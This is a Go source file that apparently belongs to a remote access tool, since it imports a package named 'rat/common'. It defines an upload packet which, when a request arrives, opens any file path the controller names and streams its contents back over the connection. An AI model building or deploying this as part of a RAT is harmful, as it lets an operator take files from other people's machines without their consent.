package main

import (
	"fmt"
	"io"
	"os"
	"rat/common"
)

type UploadPacket struct {
	File  string
	Final bool
	Data  []byte
	Total int64
}

func (packet UploadPacket) GetHeader() common.PacketHeader {
	return common.GetFileHeader
}

func (packet UploadPacket) Write(c *Connection) error {
	c.WriteString(packet.File)

	c.WriteInt64(packet.Total)
	c.WriteBool(packet.Final)

	c.WriteInt(len(packet.Data))
	c.Conn.Write(packet.Data)
	return nil
}

func (packet UploadPacket) Read(c *Connection) error {
	file, _ := c.ReadString()

	go func() {
		final := false
		local, err := os.Open(file)
		defer local.Close()
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		stat, err := local.Stat()
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		for !final {
			data := make([]byte, common.TransferPacketSize)

			read, err := local.Read(data)
			if err == io.EOF {
				final = true
			} else if err != nil {
				fmt.Println(err.Error())
				return
			}
			Queue <- UploadPacket{file, final, data[:read], stat.Size()}
		}
	}()

	return nil
}
